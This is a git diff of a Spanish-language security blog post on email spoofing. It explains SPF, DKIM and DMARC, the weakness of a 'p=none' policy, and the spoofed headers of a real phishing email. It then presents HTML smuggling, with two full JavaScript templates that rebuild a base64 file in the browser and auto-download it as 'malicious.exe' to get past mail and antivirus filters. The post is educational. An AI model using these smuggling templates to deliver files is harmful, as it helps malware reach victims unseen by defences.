@@ -1,107 +1,167 @@
 ---
 title: Test
-date: 2025-03-10
-categories: [Test]
-tags: [test]     # Los tags deben estar siempre en minúsculas.
+date: 2025-05-29
+categories: [Email]
+tags: [spoofing, email, bypass]     # Los tags deben estar siempre en minúsculas.
 
 ---
-# Este es el título principal
+# [ES] Email Spoofing:DKIM, SPF, DMARC & Fails
 
-## 1. Este es el paso 1
-Iniciaremos sesión en nuestra máquina Kali por SSH. Como siempre ejecutaremos
-	## sudo apt update 
-posteriormente instalaremos tightvncserver usando
-	## Sudo apt install thightvncserver -y 
+## 1. ¿Basics?
+Un día tranquilamente estás trabajando y te encuentras que te amenazaron hace un mes con subir fotos tuyas picantonas por internet. Como pedían poco dinero no podía ser real, así que nada, levantar alerta y ver que ha pasado…. ¿Otra vez DMARC? Pues puede que sí…. Como es más recurrente de lo que debería, vamos a profundizar un poco en DMARC y la suplantación de identidad en correo electrónico.
 
 
-## 2. Este es el paso 2
-Iniciaremos sesión en nue
+## 2. Empecemos por el principio
+Vamos a lo básico. Primero de todo ¿Que es DMARC? Tenemos una barbaridad de recursos en internet para aprender que es DMARC, pero para explicarlo de manera muy muy básica es un protocolo de autenticación centrado en evitar la suplantación de correo y que usa como punto de partida DKIM (Domain Keys Identified Mail) y SPF (Sender Policy Framework). Es decir, es un protocolo basado en políticas que debes configurar que parten de tener configurado bien DKIM y SPF y que ayudan a tomar acciones en base a estos otros dos protocolos fundamentalmente.
+SPF sirve para que yo que tengo el dominio “c0nfig.com” pueda enviar correos bajo “@c0nfig.com” indicando cuales son las IPs que son usadas para remitir esos correos. Es decir si tengo un servidor de correo en 127.0.0.1 y el SPF configurado en mi DNS correctamente todo el mundo sabrá que solo pueden recibir correos de cuentas como “auditor@c0nfig.com”  en caso de que provengan de 127.0.0.1. En caso de no ser así puede ser un comportamiento malicioso.
+Por otro lado tenemos DKIM, ayuda a que el receptor haga la verificación de que yo  “auditor@c0nfig.com” envié un correo mediante una firma autorizada por mi parte la cual puede verificar en el DNS.
+Puedes descargarte cualquier mail personal tuyo en formato .eml y analizarlo para ver el contenido, en mi caso he utilizado un correo de Steam que generé para esto. 
+![Desktop View](/assets/img/Email Spoofing/email1.png)
+Como puedes ver el proveedor de correo, en este caso gmail, de c0nfigrealmail@gmai.com verificó que DKIM y SPF era correcto para este correo y que además la política de DMARC estaba configurada. Es decir, cumpliendo los dos criterios anteriores ese correo pasa la política DMARC y llega a mi bandeja
+Puedes verificar además con los miles de analizadores que hay en internet si se cumple o no el filtro DMARC en un dominio. Por ejemplo para steampowered.com aparece correctamente configurado el filtro DMARC.
+![Desktop View](/assets/img/Email Spoofing/Imagen2.png)
 
-## 3. Sorprendentemente este es el paso 3
-Iniciaremos sesión en nue
-
-
-## Prompts
-
-<!-- markdownlint-capture -->
-<!-- markdownlint-disable -->
-> An example showing the `tip` type prompt.
-{: .prompt-tip }
-
-> An example showing the `info` type prompt.
-{: .prompt-info }
-
-> An example showing the `warning` type prompt.
-{: .prompt-warning }
-
-> An example showing the `danger` type prompt.
-{: .prompt-danger }
-<!-- markdownlint-restore -->
-## Tables
-
-| Company                      | Contact          | Country |
-| :--------------------------- | :--------------- | ------: |
-| Alfreds Futterkiste          | Maria Anders     | Germany |
-| Island Trading               | Helen Bennett    |      UK |
-| Magazzini Alimentari Riuniti | Giovanni Rovelli |   Italy |
-
-## Links
-
-<http://127.0.0.1:4000>
-
-## Footnote
-
-Click the hook will locate the footnote[^footnote], and here is another footnote[^fn-nth-2].
-
-## Inline code
-
-This is an example of `Inline Code`.
-
-## Filepath
-
-Here is the `/path/to/the/file.extend`{: .filepath}.
-
-## Code blocks
-
-### Common
+## 3. Misconfigs en DMARC
+¿Has configurado bien DMARC? Porque claro si haces “p=none”…..
+Una vez has configurado SPF, DKIM y te has sentado a los basics de DMARC toca ponerlo a funcionar. Existen 3 políticas básicas de DMARC:
+•	p=none : supervisión o monitorización. Genera reportes pero no bloquea.
+•	p=quarentine : los correos se envían a la carpeta de SPAM
+•	p=reject: Los correos no autentidacos se rechazan y no se entregan.
+Espera…. ¿Puedo configurar DMARC y que no haga nada? Correcto.
+Este es un ejemplo de suplantación real en el que el atcante consigue con un fail en SPF y un pass en DKIM suplantar un servicio SMTP y posteriormente suplantar el remitente del correo. Con eso es capaz de enviarte un correo que a ojos de la victima está enviado desde c0nfig@c0nfigrealdomain.com a c0nfig@c0nfigrealdomain.com con el objetivo de extorsionarte.
+![Desktop View](/assets/img/Email Spoofing/Imagen3.png)
+Como no existe un filtro DMARC este correo no es bloqueado directamente, por lo que dependerás de controles complementarios tales como la inteligencia de tu proveedor de mail así como de que el atacante haga mal su trabajo para ser detectado por patrones. 
+/HINT: existen patrones que usan los proveedores de mail para redirigir esto. Cosas como por ejemplo en este caso incluir una cartera de bitcoin forman parte de los IOCs que se usan, pero también puede ser la concatenación de técnicas o que sea simplemente el primer correo que se envia de esa dirección a este destino. Además del estudio de campañas activas para señalar las IPs de origen de los envios o los links de destino.
+Puedes utilizar cualquier herramienta en internet por si quieres consultar el estado de tu DMARC rápidamente. Uno vulnerable verás que tiene p=none y una salida similar a esta:
 
 ```text
-This is a common code snippet, without syntax highlight and line number.
+v=DMARC1; p=none; pct=100; sp=none; rua=c0nfig@c0nfigrealdomain.com,mailto:c0nfig@c0nfigrealdomain.com; ruf=mailto:4cf536a7@inbox.ondmarc.com,mailto:c0nfig@c0nfigrealdomain.com; adkim=r; aspf=r; fo=0:1:d:s; rf=afrf; ri=3600
 ```
 
-### Specific Language
+## 4. Phishing Analysis: Copiemos a los malos
+Los lunes me gusta meterme en la carpeta de SPAM ya que suelen tocarme miles de euros. Este es solo un ejemplo de los miles de correos que me van a hacer millonario en cualquier momento.
+![Desktop View](/assets/img/Email Spoofing/Imagen4.png)
+Desde luego “CashApp” me va a hacer rico, pero espera… ¿porqué aparece como que el mail se ha enviado desde mi cuenta? Correcto el “Trusted Sender” es mi propio correo. Y aparece enviado para me@aol.com que no es mi cuenta…. ¿raro no? CashApp suele ser confiable… algo habrá pasado
+![Desktop View](/assets/img/Email Spoofing/Imagen5.png)
+Descargamos el .eml a ver que ha podido pasar aquí.
+![Desktop View](/assets/img/Email Spoofing/Imagen6.png)
+Como podemos ver, aunque el contenido del .eml es más extenso, podemos ver cosas interesantes como la existencia de un SPF bien configurado, es decir yo puedo asegurar que 103.21.89.71 puede enviar correos en nombre de @miks.akenator.com … Teniendo en cuenta que la mayoría de sistemas de detección no te van a pasar no tener SPF configurado, es algo sencillo que te puede facilitar las cosas. Pero existen otras técnicas usadas en este phishing, comentamos algunas.  
 
-```bash
-if [ $? -ne 0 ]; then
-  echo "The command was not successful.";
-  #do the needful / exit
-fi;
+```email
+X-Google-Sender-Delegation: c0nfigrealmail@gmail.com Trusted Sender.
 ```
+Este header lo genera Google y es el cumpable de que aparezca que el correo ha sido enviado por mi mismo y que es confiable. Es una inyección de encabezados que trata de dar cierta entidad al correo.
 
-### Specific filename
-
-```sass
-@import
-  "colors/light-typography",
-  "colors/dark-typography";
+```email
+Received: from west.evarmactengiri.com ...
+Received: from mta8132.mp2200.com ...
+Received: from vmta186.85.lstrk.net ...
+Received: from efianalytics.com ...
 ```
-{: file='_sass/jekyll-theme-chirpy.scss'}
+Uso de hops para tratar de simular la recepción del correo y evitar que el bloqueo del origen suponga la detección del phishing.
+
+```email
+List-ID: c0nfigrealmail.xt.local
+```
+Es un header opcional, pero si usas tu nombre de correo pues puede ayudar si no se tiene mucha idea a colarlo. Además le añade complejidad al análisis como tal. 
+
+```email
+Delivered-To: me@gmail.com
+To: me@aol.com
+```
+El campo “Delivered-To:” se envia al comienzo, peeeeeeeero puedes tratar de confundir a Gmail (y como se demuestra conseguirlo) incluyendo diferentes referencias al envio sumándolo a los hops. 
 
 
-### Float to left
+## 3. HTLM Smugling
+HTML Smuglig es una técnica usada para esconder ficheros en filtros de contenido mediante javascript. Este es un ejemplo de link malicioso real embebido en un phishing:
 
-![Desktop View](/assets/img/mod.png){: width="972" height="589" .w-50 .left}
-Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.
+```HTML
+<a href="https://tinyurl.com/MALICIUS_PAYLOAD" target="_blank">
+```
+Como hemos dicho antes existen controles por parte de tu proveedor o tu antivirus los cuales tratan los enlaces para poder clasificar el mail y reportarlo. 
+Los atacantes tenemos formas de evitar estos controles, principalmente usando HTML Smugling. Con esto podemos evitar que se analice el enlace para construir la URL en el navegador en la ejecución. 
+Existen multitud de ejemplos como:
 
-</br>
+```HTML
+<html>
+   <body>
+      <script>
+         function base64ToArrayBuffer(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array(len);
+            for (var i = 0; i < len; i++) {
+                bytes[i] = binary_string.charCodeAt(i); 
+            } 
+            return bytes.buffer;
+         } 
+         var file = "BASE64 FILE HERE";
+         var data = base64ToArrayBuffer(file);
+         var blob = new Blob([data], {type: "octet/stream"});
+         var fileName = "malicious.exe";
+         var a = document.createElement("a");
+         document.body.appendChild(a);
+         a.style = "display: none";
+         var url = window.URL.createObjectURL(blob);
+         a.href = url;
+         a.download = fileName;
+         a.click();
+         window.URL.revokeObjectURL(url);
+      </script>
+   </body>
+</html>
+```
+o por ejemplo 
 
-### Float to right
+```HTML
+<html>
+    <head>
+        <title>Your banck</title>
+    </head>
+    <body>
+        <p>Real no fake money for you</p>
 
-![Desktop View](/assets/img/mod.png){: width="972" height="589" .w-50 .right}
-Praesent maximus aliquam sapien. Sed vel neque in dolor pulvinar auctor. Maecenas pharetra, sem sit amet interdum posuere, tellus lacus eleifend magna, ac lobortis felis ipsum id sapien. Proin ornare rutrum metus, ac convallis diam volutpat sit amet. Phasellus volutpat, elit sit amet tincidunt mollis, felis mi scelerisque mauris, ut facilisis leo magna accumsan sapien. In rutrum vehicula nisl eget tempor. Nullam maximus ullamcorper libero non maximus. Integer ultricies velit id convallis varius. Praesent eu nisl eu urna finibus ultrices id nec ex. Mauris ac mattis quam. Fusce aliquam est nec sapien bibendum, vitae malesuada ligula condimentum.
+        <script>
+        function convertFromBase64(base64) {
+            var binary_string = window.atob(base64);
+            var len = binary_string.length;
+            var bytes = new Uint8Array( len );
+            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+            return bytes.buffer;
+        }
 
----
----
+        var file ='hashashashashahsh=';
+        var data = convertFromBase64(file);
+        var blob = new Blob([data], {type: 'octet/stream'});
+        var fileName = 'test.txt';
+
+        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+        else {
+            var a = document.createElement('a');
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            var url = window.URL.createObjectURL(blob);
+            a.href = url;
+            a.download = fileName;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+        </script>
+    </body>
+</html>
+```
+Cuando visites la página el navegador reconstruirá y descargará el fichero sin que el usuario haya tenido que interactuar ni exponer el link. 
+
+> Recuerda que el fichero siempre tendrá en su descarga marcada la procedencia del mismo, internet, así como el link. Puedes usar gc para comprobarlo por ti mismo.
+```Powershell
+PS C:\Users\c0nfig\Downloads> gc .\c0nfig.txt -Stream Zone.Identifier
+[ZoneTransfer]
+ZoneId=3
+ReferrerUrl=http://c0nfigrealdomain.com/mysuggler.html
+HostUrl=http://c0nfigrealromain.com/
+```
+{: .prompt-info }
+
 
 ## Apoya el contenido de ciberseguridad en castellano
 
